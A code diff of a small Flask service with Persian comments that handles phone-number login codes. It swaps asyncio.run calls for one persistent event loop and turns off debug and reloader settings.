@@ -24,6 +24,12 @@ sessions = {}
 logging.basicConfig(level=logging.INFO)
 
 # ============================================================
+#  حلقه رویداد ثابت
+# ============================================================
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
+
+# ============================================================
 #  روت‌ها
 # ============================================================
 @app.route('/health', methods=['GET'])
@@ -40,9 +46,9 @@ def request_code():
     session_id = f"session_{phone.replace('+', '')}"
     sessions[session_id] = {'phone': phone, 'status': 'pending', 'client': None}
     
-    # ✅ استفاده از asyncio.run به جای create_task
+    # اجرا با حلقه رویداد ثابت
     try:
-        asyncio.run(send_code(session_id, phone))
+        loop.run_until_complete(send_code(session_id, phone))
     except Exception as e:
         logging.error(f"Error in request_code: {e}")
         return jsonify({'error': str(e)}), 500
@@ -63,9 +69,8 @@ def verify_code():
     if not session:
         return jsonify({'error': 'Session not found'}), 400
     
-    # ✅ استفاده از asyncio.run به جای create_task
     try:
-        asyncio.run(verify_session(session_id, phone, code))
+        loop.run_until_complete(verify_session(session_id, phone, code))
     except Exception as e:
         logging.error(f"Error in verify_code: {e}")
         return jsonify({'error': str(e)}), 500
@@ -135,4 +140,4 @@ async def send_to_bot(message):
 # ============================================================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
